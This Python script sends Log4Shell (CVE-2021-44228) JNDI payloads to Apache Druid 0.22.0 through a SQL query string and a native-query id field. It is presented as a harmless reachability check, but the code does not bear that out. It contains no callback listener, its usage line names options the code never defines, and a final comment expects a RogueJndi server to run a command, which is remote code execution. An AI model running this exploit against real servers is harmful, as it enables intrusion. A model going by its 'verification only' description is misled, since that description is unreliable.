#!/usr/bin/env python3
"""
Log4Shell (CVE-2021-44228) exploitability verification for Apache Druid 0.22.0.

This script confirms that the JNDI lookup is triggered when a crafted payload
is sent to Druid, proving the dependency is not only present but reachable.
It does NOT load or execute any remote class — it only listens for the LDAP
connection attempt, which is sufficient proof of exploitability.

Usage:
    python3 verify_log4shell.py [--host HOST] [--port PORT] [--listen-port LPORT]
"""

import socket
import threading
import requests
import argparse
import time
import sys

TRIGGERED = threading.Event()


def send_payload(base_url: str):
    """Send the Log4Shell payload across multiple Druid endpoints."""
    jndi = "${jndi:ldap://127.0.0.1:1389/o=reference}"

    endpoints = [
        # SQL string literal — wrapping in single quotes makes it valid SQL so
        # the query passes Druid's parser and reaches LoggingRequestLogger,
        # which calls LOG.info("%s", line) with the full query JSON.
        # log4j evaluates ${jndi:...} inside that message string.
        {
            "method": "POST",
            "url": base_url + "/druid/v2/sql",
            "headers": {"Content-Type": "application/json"},
            "json": {"query": f"SELECT '{jndi}'"},
            "desc": "SQL string literal",
        },
        # Native query with payload in id field — logged on query completion.
        {
            "method": "POST",
            "url": base_url + "/druid/v2/",
            "headers": {"Content-Type": "application/json"},
            "json": {
                "queryType": "timeseries",
                "dataSource": "nonexistent",
                "granularity": "all",
                "intervals": ["2000-01-01/2000-01-02"],
                "aggregations": [{"type": "count", "name": "count"}],
                "id": jndi,
            },
            "desc": "native query id field",
        },
    ]

    for ep in endpoints:
        print(f"[*] Trying {ep['desc']} → {ep['url']}")
        try:
            if ep["method"] == "POST":
                requests.post(ep["url"], headers=ep["headers"],
                              json=ep.get("json"), timeout=5)
            else:
                requests.get(ep["url"], headers=ep["headers"], timeout=5)
        except requests.exceptions.RequestException as e:
            print(f"    [~] {e}")


def main():
    parser = argparse.ArgumentParser(description="Verify Log4Shell (CVE-2021-44228) on Druid")
    parser.add_argument("--host", default="http://localhost:8888", help="Druid base URL")
    parser.add_argument("--timeout", type=int, default=10, help="Seconds to wait for callback")
    args = parser.parse_args()

    base_url = args.host.rstrip("/")

    # Send payloads across multiple endpoints.
    send_payload(base_url)

    # Expect that a command is run as provided by
    # java -jar target/RogueJndi-1.1.jar --command <command>


if __name__ == "__main__":
    main()
